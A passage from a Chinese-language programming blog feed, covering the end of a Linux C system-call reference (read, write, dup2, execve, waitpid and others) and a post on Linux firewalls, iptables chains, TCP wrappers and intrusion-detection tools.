</span></span><br><span class="line"><span class="comment">ENAMETOOLONG：路径名太长 </span></span><br><span class="line"><span class="comment">ENOENT：  路径名中的目录不存在或是无效的符号连接 </span></span><br><span class="line"><span class="comment">ENOTDIR： 路径名中当作目录的组件并非目录 </span></span><br><span class="line"><span class="comment">EROFS： 文件系统只读 </span></span><br><span class="line"><span class="comment">EFAULT： 路径名指向可访问的空间外 </span></span><br><span class="line"><span class="comment">EIO：  输入输出错误 </span></span><br><span class="line"><span class="comment">ENOMEM： 不能获取足够的内核内存 </span></span><br><span class="line"><span class="comment">ETXTBSY：对程序写入出错</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></li><li><h3 id="close"><a href="#close" class="headerlink" title="close()"></a><code>close()</code></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">close</span><span class="params">(<span class="keyword">int</span> fd)</span></span>;</span><br><span class="line"><span class="comment">/*参数</span></span><br><span class="line"><span class="comment">fd:open函数返回的文件描述符</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//返回值：若文件顺利关闭则返回0, 发生错误时返回-1.</span></span><br><span class="line"><span class="comment">//错误代码：EBADF 参数fd 非有效的文件描述词或该文件已关闭.</span></span><br></pre></td></tr></table></figure></li><li><h3 id="perror"><a href="#perror" class="headerlink" title="perror()"></a><code>perror()</code></h3><p>可以打印出最近一次异常信息，如果提供了指定的字符串，就可以在指定的字符串后面输出异常信息。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">perror</span><span class="params">(<span class="keyword">char</span> *<span class="built_in">string</span>)</span></span>;</span><br></pre></td></tr></table></figure></li><li><h3 id="read"><a href="#read" class="headerlink" title="read()"></a><code>read()</code></h3><p>read函数从指定的打开的文件fd中读取指定大小count的字节到从buf开始的缓冲，缓冲区可以是用户自定义的一个数据形式。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="keyword">ssize_t</span> read(<span class="keyword">int</span> fd, <span class="keyword">void</span> * buf, <span class="keyword">size_t</span> count);</span><br><span class="line"><span class="comment">/*参数说明</span></span><br><span class="line"><span class="comment">fd:文件描述符</span></span><br><span class="line"><span class="comment">buf:定义的缓冲区</span></span><br><span class="line"><span class="comment">count: 需要读取的字节</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//返回值:若读取失败则返回-1.读取成功则返回实际读取到的字节数.</span></span><br><span class="line"><span class="comment">/*错误代码</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">EINTR 此调用被信号所中断.</span></span><br><span class="line"><span class="comment">EAGAIN 当使用不可阻断I/O 时(O_NONBLOCK), 若无数据可读取则返回此值.</span></span><br><span class="line"><span class="comment">EBADF 参数fd 非有效的文件描述词, 或该文件已关闭.</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></li><li><h3 id="write"><a href="#write" class="headerlink" title="write()"></a><code>write()</code></h3><p>把参数buf 所指的内存写入count 个字节到参数fd所指的文件内。当然,文件读写位置也会随之移动。这个函数和上个函数有一点是需要注意的就是缓冲区的大小可能比文件的内容大小要小，这个时候会有一个特征值<code>-1</code>返回给程序员。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ssize_t</span> write (<span class="keyword">int</span> fd, <span class="keyword">const</span> <span class="keyword">void</span> * buf, <span class="keyword">size_t</span> count);</span><br><span class="line"><span class="comment">/*参数</span></span><br><span class="line"><span class="comment">fd:文件描述符</span></span><br><span class="line"><span class="comment">buf:缓冲区</span></span><br><span class="line"><span class="comment">count:需要写入的字节数</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">//返回值：成功的话就会返回写入字节大小，数组溢出返回-1.</span></span><br></pre></td></tr></table></figure></li><li><h3 id="getcwd"><a href="#getcwd" class="headerlink" title="getcwd()"></a><code>getcwd()</code></h3><p>获取当前目录名</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span> * <span class="title">getcwd</span><span class="params">(<span class="keyword">char</span> * buf, <span class="keyword">size_t</span> size)</span></span>;</span><br><span class="line"><span class="comment">/*参数定义：</span></span><br><span class="line"><span class="comment">buf：为一个缓存数组</span></span><br><span class="line"><span class="comment">size：为数组的大小</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><ul><li><h3 id="getpwuid"><a href="#getpwuid" class="headerlink" title="getpwuid()"></a><code>getpwuid()</code></h3></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pwd.h&gt;    </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">定义函数：<span class="function">struct passwd * <span class="title">getpwuid</span><span class="params">(<span class="keyword">uid_t</span> uid)</span></span>;</span><br></pre></td></tr></table></figure><ul><li><h3 id="getuid"><a href="#getuid" class="headerlink" title="getuid()"></a><code>getuid()</code></h3></li></ul><p>用来取得执行目前进程的用户识别码.没有返回值来指示错误。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;    </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">uid_t</span> getuid(<span class="keyword">void</span>);</span><br></pre></td></tr></table></figure></p><ul><li><h3 id="uname"><a href="#uname" class="headerlink" title="uname()"></a><code>uname()</code></h3><p>返回一个关于系统信息的结构体，非负表示调用成功，负数表示返回失败。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/utsname.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">uname</span><span class="params">(struct utsname *name )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">utsname</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span> sysname[];</span><br><span class="line">    <span class="keyword">char</span> nodename[];</span><br><span class="line">    <span class="keyword">char</span> release[];</span><br><span class="line">    <span class="keyword">char</span> version[];</span><br><span class="line">    <span class="keyword">char</span> machine[];</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifdef</span> _GNU_SOURCE</span></span><br><span class="line">    <span class="keyword">char</span> domainname[];</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><h3 id="dup-与dup2"><a href="#dup-与dup2" class="headerlink" title="dup()与dup2()"></a><code>dup()</code>与<code>dup2()</code></h3><p>复制一个现存的文件描述符。其中标识符<code>0，1，2</code>分别被<code>标准输入</code>，<code>标准输出</code>，<code>标准错误输出</code>占用<br>dup()用来复制参数oldfd 所指的文件描述词, 并将它返回. 此新的文件描述词和参数oldfd 指的是同一个文件, 共享所有的锁定、读写位置和各项权限或旗标. 例如, 当利用lseek()对某个文件描述词作用时, 另一个文件描述词的读写位置也会随着改变。<br>dup2只是多指定了newfd而已，程序员可以直接将oldfd文件符copy到一个自定义的文件符上，若参数newfd为一已打开的文件描述词, 则newfd 所指的文件会先被关闭. dup2()所复制的文件描述词。</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dup</span><span class="params">(<span class="keyword">int</span> oldfd)</span></span>;</span><br><span class="line"><span class="comment">//返回值：当复制成功时, 则返回最小及尚未使用的文件描述词. 若有错误则返回-1, errno 会存放错误代码.</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dup2</span><span class="params">(<span class="keyword">int</span> oldfd, <span class="keyword">int</span> newfd)</span></span>;</span><br><span class="line"><span class="comment">//返回值：当复制成功时, 则返回newfd文件描述词. 若有错误则返回-1, errno 会存放错误代码.</span></span><br></pre></td></tr></table></figure><ul><li><h3 id="strtok"><a href="#strtok" class="headerlink" title="strtok()"></a><code>strtok()</code></h3><p>用于对字符串进行拆分</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span> * <span class="title">strtok</span><span class="params">(<span class="keyword">char</span> *s, <span class="keyword">const</span> <span class="keyword">char</span> *delim)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*例子</span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">int main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">   const char str[80] = "This is - www.w3cschool.cc - website";</span></span><br><span class="line"><span class="comment">   const char s[2] = "-";</span></span><br><span class="line"><span class="comment">   char *token;</span></span><br><span class="line"><span class="comment">   </span></span><br><span class="line"><span class="comment">   /* 获取第一个子字符串 */</span></span><br><span class="line">   token = strtok(str, s);</span><br><span class="line">   </span><br><span class="line">   <span class="comment">/* 继续获取其他的子字符串 */</span></span><br><span class="line">   <span class="keyword">while</span>( token != <span class="literal">NULL</span> ) </span><br><span class="line">   &#123;</span><br><span class="line">      <span class="built_in">printf</span>( <span class="string">" %s\n"</span>, token );</span><br><span class="line">    </span><br><span class="line">      token = strtok(<span class="literal">NULL</span>, s);</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">*/</span><br></pre></td></tr></table></figure></li><li><h3 id="setbuf"><a href="#setbuf" class="headerlink" title="setbuf()"></a><code>setbuf()</code></h3><p>程序输出有两种方式：一种是即时处理方式，另一种是先暂存起来，然后再大块写入的方式，前者往往造成较高的系统负担。因此，c语言实现通常都允许程序员进行实际的写操作之前控制产生的输出数据量。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line">setbuf(<span class="built_in">stdout</span>，buf);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">语句将通知输入/输出库，所有写入到stdout的输出都应该使用buf作为输出缓冲区，直到buf缓冲区被填满或者程序员直接调用fflush（译注：对于由写操作打开的文件，调用fflush将导致输出缓冲区的内容被实际地写入该文件），buf缓冲区中的内容才实际写入到stdout中。缓冲区的大小由系统头文件&lt;stdio.h&gt;中的BUFSIZ定义。</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></li><li><h3 id="execve"><a href="#execve" class="headerlink" title="execve()"></a><code>execve()</code></h3><p>在父进程中fork一个子进程，在子进程中调用exec函数启动新的程序。exec函数一共有六个，其中execve为内核级系统调用，其他（execl，execle，execlp，execv，execvp）都是调用execve的库函数。</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">execve</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *filename, <span class="keyword">char</span> *<span class="keyword">const</span> argv[ ], <span class="keyword">char</span> *<span class="keyword">const</span> envp[ ])</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*参数</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">filename:需要执行的二进制文件路径</span></span><br><span class="line"><span class="comment">argv:二进制执行时的参数设置</span></span><br><span class="line"><span class="comment">envp:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">//返回值 函数执行成功时没有返回值，执行失败时的返回值为-1</span></span><br></pre></td></tr></table></figure><p>execve()用来执行参数filename字符串所代表的文件路径，第二个参数是利用数组指针来传递给执行文件，并且需要以空指针(NULL)结束，这里应该特别注意，因为在c语言中的字符串默认是<code>\0</code>结尾，所以很多时候是需要编程人员自己去设置结尾符，最后一个参数则为传递给执行文件的新环境变量数组。</p><ul><li><h3 id="waitpid-与wait"><a href="#waitpid-与wait" class="headerlink" title="waitpid()与wait()"></a><code>waitpid()</code>与<code>wait()</code></h3><p>wait等待第一个终止的子进程，而waitpid可以通过pid参数指定等待哪一个子进程。当pid=-1、option=0时，waitpid函数等同于wait，可以把wait看作waitpid实现的特例。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="keyword">pid_t</span> waitpid(<span class="keyword">pid_t</span> pid, <span class="keyword">int</span> *status, <span class="keyword">int</span> options);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*参数</span></span><br><span class="line"><span class="comment">int类型的status 是用来保存子进程的返回码</span></span><br><span class="line"><span class="comment">pid标识了需要等待的进程</span></span><br><span class="line"><span class="comment">option参数可以用来进行一些wait设置</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*常用的option有：</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">1、pid&lt;-1 等待进程组识别码为pid绝对值的任何子进程.</span></span><br><span class="line"><span class="comment">2、pid=-1 等待任何子进程, 相当于wait().</span></span><br><span class="line"><span class="comment">3、pid=0 等待进程组识别码与目前进程相同的任何子进程.</span></span><br><span class="line"><span class="comment">4、pid&gt;0 等待任何子进程识别码为pid 的子进程.</span></span><br><span class="line"><span class="comment">参数option 可以为0 或下面的OR 组合：</span></span><br><span class="line"><span class="comment">1、WNOHANG：如果没有任何已经结束的子进程则马上返回, 不予以等待；</span></span><br><span class="line"><span class="comment">2、WUNTRACED：如果子进程进入暂停执行情况则马上返回, 但结束状态不予以理会. 子进程的结束状态返回后存于status, 底下有几个宏可判别结束情况；</span></span><br><span class="line"><span class="comment">3、WIFEXITED(status)：如果子进程正常结束则为非0 值；</span></span><br><span class="line"><span class="comment">4、WEXITSTATUS(status)：取得子进程exit()返回的结束代码, 一般会先用WIFEXITED 来判断是否正常结束才能使用此宏；</span></span><br><span class="line"><span class="comment">5、WIFSIGNALED(status)：如果子进程是因为信号而结束则此宏值为真；</span></span><br><span class="line"><span class="comment">6、WTERMSIG(status)：取得子进程因信号而中止的信号代码, 一般会先用WIFSIGNALED 来判断后才使用此宏；</span></span><br><span class="line"><span class="comment">7、WIFSTOPPED(status)：如果子进程处于暂停执行情况则此宏值为真. 一般只有使用WUNTRACED时才会有此情况；</span></span><br><span class="line"><span class="comment">8、WSTOPSIG(status)：取得引发子进程暂停的信号代码, 一般会先用；</span></span><br><span class="line"><span class="comment">9、WIFSTOPPED 来判断后才使使用此宏。</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></li><li><h3 id="mmset"><a href="#mmset" class="headerlink" title="mmset()"></a><code>mmset()</code></h3><p>在一段内存块中填充某个给定的值，它是对较大的结构体或数组进行清零操作的一种最快方法。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;/*in c*/</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;/*in c++*/</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">memset</span><span class="params">(<span class="keyword">void</span> *s, <span class="keyword">int</span> ch, <span class="keyword">size_t</span> n)</span></span>;</span><br><span class="line"><span class="comment">/*参数</span></span><br><span class="line"><span class="comment">s :将要被填充任意数据类型指针</span></span><br><span class="line"><span class="comment">ch:用来填充的字符，通常是0</span></span><br><span class="line"><span class="comment">n:将要填充的字节数</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></li><li><h3 id="bzero"><a href="#bzero" class="headerlink" title="bzero()"></a><code>bzero()</code></h3><p>用于将一个字节字符串的前n个字节置零，配合sizeof或者strlen常常用于buf缓冲区的初始化，这个函数的出现可以很大程度的减少c语言里面数组溢出的危险。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">void</span> <span class="title">bzero</span><span class="params">(<span class="keyword">void</span> *s, <span class="keyword">int</span> n)</span></span>;</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> API </tag>
            
            <tag> C </tag>
            
            <tag> 操作系统 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>linux防火墙</title>
      <link href="/2018/06/23/linux%E9%98%B2%E7%81%AB%E5%A2%99/"/>
      <url>/2018/06/23/linux%E9%98%B2%E7%81%AB%E5%A2%99/</url>
      
        <content type="html"><![CDATA[<p><img style="margin: auto;" src="/myimages/iptable/index.jpg" height="500" width="500"></p><h1 id="常见的网络服务以及端口表格"><a href="#常见的网络服务以及端口表格" class="headerlink" title="常见的网络服务以及端口表格"></a>常见的网络服务以及端口表格</h1><div class="table-container"><table><thead><tr><th>服务</th><th>默认开放的端口</th><th>说明</th></tr></thead><tbody><tr><td>ftp</td><td>21/tcp</td><td>FTP控制 文件传输协议</td></tr><tr><td>ftp</td><td>20/tcp</td><td>FTP数据</td></tr><tr><td>Telnet</td><td>23</td><td>Telnet 不安全的文本传送</td></tr><tr><td>ssh</td><td>22/tcp</td><td>SSH 安全登录、文件传送(SCP)和端口重定向</td></tr><tr><td>smtp</td><td>25/tcp</td><td>SMTP 简单邮件传输协议(Simple Mail Transfer Protocol)(E-mail)</td></tr><tr><td>domain</td><td>53/tcp</td><td>域名服务器</td></tr><tr><td>domain</td><td>53/udp</td><td>WWW (HTTP超文本传送协议)</td></tr><tr><td>http</td><td>80/tcp</td><td>WWW (HTTP超文本传送协议)</td></tr><tr><td>https</td><td>443/tcp</td><td>HTTPS 经过加密的HTTP(used for securely transferring web pages)</td></tr><tr><td>ntp</td><td>123/udp</td><td>网络时间协议 </td></tr><tr><td>mysql</td><td>3306</td><td>mysql数据库服务</td></tr><tr><td>socks</td><td>1080/tcp</td><td>SOCKS  </td></tr><tr><td>rpc</td><td>111</td><td>远程调用协议（提供类似于nfs,nis服务器的端口申请和对客户端端口询问执行回复）</td></tr><tr><td>SMB</td><td>139</td><td>SMB服务器</td></tr></tbody></table></div><a id="more"></a><ul><li><a href="https://cnbin.github.io/blog/2015/08/22/wang-luo-chang-yong-duan-kou-hao-da-quan/" target="_blank" rel="noopener">更多有关端口与对应的网络服务的信息</a>  <h1 id="防火墙设置"><a href="#防火墙设置" class="headerlink" title="防火墙设置"></a>防火墙设置</h1>三种基础防火墙形式：Netfilter (封包过滤机制)，TCP Wrappers (程序控管)，Proxy (代理服务器)  </li><li><h2 id="三种常见的防火墙布线模式："><a href="#三种常见的防火墙布线模式：" class="headerlink" title="三种常见的防火墙布线模式："></a>三种常见的防火墙布线模式：</h2><h3 id="仅一个防火墙部署在路由器"><a href="#仅一个防火墙部署在路由器" class="headerlink" title="仅一个防火墙部署在路由器"></a>仅一个防火墙部署在路由器</h3><img src="/myimages/iptable/firewall_01.png" alt="sdsdsd"><h3 id="内部需要保护的网络再多加一个防火墙"><a href="#内部需要保护的网络再多加一个防火墙" class="headerlink" title="内部需要保护的网络再多加一个防火墙"></a>内部需要保护的网络再多加一个防火墙</h3><img src="/myimages/iptable/firewall_02.png" alt="image"><h3 id="隔离态的网络服务器型防火墙部署（DMZ）"><a href="#隔离态的网络服务器型防火墙部署（DMZ）" class="headerlink" title="隔离态的网络服务器型防火墙部署（DMZ）"></a>隔离态的网络服务器型防火墙部署（DMZ）</h3><img src="/myimages/iptable/firewall_03.png" alt="image"></li></ul><h1 id="TCP-wrappers-程序管理"><a href="#TCP-wrappers-程序管理" class="headerlink" title="TCP wrappers 程序管理"></a>TCP wrappers 程序管理</h1><p>即以 /etc/host.{allow|deny}的规定来对应用程序的访问ip来源进行规定，但是这样的管理比较粗糙，而iptables针对数据包的字段来进行过滤就实用得多。</p><ul><li>受TCP wrappers管理的程序有两个必须的先决条件</li></ul><ol><li>super deamon 所管理的服务（也即xinetd）</li><li>支持libwrap.io模块的服务<h1 id="iptables"><a href="#iptables" class="headerlink" title="iptables"></a>iptables</h1>iptables是从以往内核(2.2)中的ipchains发展而来的防火墙机制。</li></ol><p>-如何查看哪些程序支持TCP wrappers,可以使用以下方式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#centos系统</span><br><span class="line">chkconfig --list # 查看xinetd 字段下的服务</span><br><span class="line"></span><br><span class="line">lld $(which $servername)|grep libweap #查看有链接libwrap.io库的服务</span><br></pre></td></tr></table></figure></p><h1 id="iptables-ip6tables的相关概念"><a href="#iptables-ip6tables的相关概念" class="headerlink" title="iptables/ip6tables的相关概念"></a>iptables/ip6tables的相关概念</h1><p><a href="https://netfilter.org/projects/iptables/index.html" target="_blank" rel="noopener">Linux下的netfilter系列</a></p><blockquote><p>注意二者的使用规则基本一致<br><a href="https://linux.die.net/man/8/iptables" target="_blank" rel="noopener">Linux下的man在线官网中的iptables介绍</a><br><a href="https://linux.die.net/man/8/ip6tables" target="_blank" rel="noopener">Linux下的man在线官网中的ip6tables介绍</a></p></blockquote><ul><li><p>iptables 的一些概念：表和链。<br>表：规则链的集合，常用的表有：filter,nat,mangle,自定义的表<br>链：之所以称为链，防火墙的规则是具有顺序的，从上到下，越严格的规则越靠前。</p></li><li><p>Filter的三条链<br>INPUT:主要与想要进入本机的数据包有关<br>OUTPUT:主要与linux本机要送出的数据包有关<br>FORWARD:与linux本机没有关系，可以传递到内网中（也就是后端机子）  </p></li></ul><ul><li>NAT常用的三条链  </li><li>PREROUTING:在进行路由判断之前检查的规则<br>POSTROUTING:在路由判断后检查<br>OUTPUT:与发送出去的数据有关  </li></ul><ul><li>借用《鸟哥的私房菜服务篇的图来方便理解》</li></ul><ol><li><p>表<br><img src="/myimages/iptable/iptables_02.png" alt="image"></p></li><li><p>链</p></li></ol><p><img src="/myimages/iptable/iptables_01.png" alt="image"></p><ol><li>表的分布逻辑<br><img src="/myimages/iptable/iptables_03.gif" alt="image"><br>去掉mangle攻击者表后的简化模型<br><img src="/myimages/iptable/iptables_04.gif" alt="image"></li></ol><h1 id="iptables-ip6tables的使用细节和一些大致概念"><a href="#iptables-ip6tables的使用细节和一些大致概念" class="headerlink" title="iptables/ip6tables的使用细节和一些大致概念"></a>iptables/ip6tables的使用细节和一些大致概念</h1><ul><li>man在线文档和man的使用已经可以把一些常用的语法给列出个大概，笔者不喜欢做重复的事，所以仅在这里对iptables的大致命令架构以及具体的布局方案在这里做个记录（日后随着自己的见识，实践或者积累来进行）</li></ul><ol><li>-m 的拓展模块很多，可以大大增强iptables的功能，里面的模块需要积累</li><li>-j 的拓展Target参数也是很多的，除了掌握常用的，还有随着经验积累一些特别的</li></ol><blockquote><p>待持续……</p></blockquote><h1 id="nftables新型防火墙以及ufw不复杂防火墙设置，比iptable简单"><a href="#nftables新型防火墙以及ufw不复杂防火墙设置，比iptable简单" class="headerlink" title="nftables新型防火墙以及ufw不复杂防火墙设置，比iptable简单"></a>nftables新型防火墙以及ufw不复杂防火墙设置，比iptable简单</h1><h1 id="常用的防火墙辅助分析工具"><a href="#常用的防火墙辅助分析工具" class="headerlink" title="常用的防火墙辅助分析工具"></a>常用的防火墙辅助分析工具</h1><ul><li>chrootkit:对rootkit后门的自动化检测</li><li>swatch等类似的日志分析工具</li><li>snort检测机制</li><li>arpwatch 基于硬件mac地址的类的检测工具</li><li>所谓一个好汉三个帮，在单一的防火墙机制下的系统以及网路防护终归不是个好办法，所以以上的工具在很多的linux发行版中都可以直接通过包管理工具直接进行下载安装，也可以去官网下载源码来make一下，各种工具的合理配置和使用可以和我们的防火墙防护技术相得益彰。</li></ul>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> 安全 </tag>
            
            <tag> 运维 </tag>
            
            <tag> 防火墙 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ajax全局变量赋值的坑</title>
      <link href="/2018/05/09/ajax%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E8%B5%8B%E5%80%BC%E7%9A%84%E5%9D%91/"/>
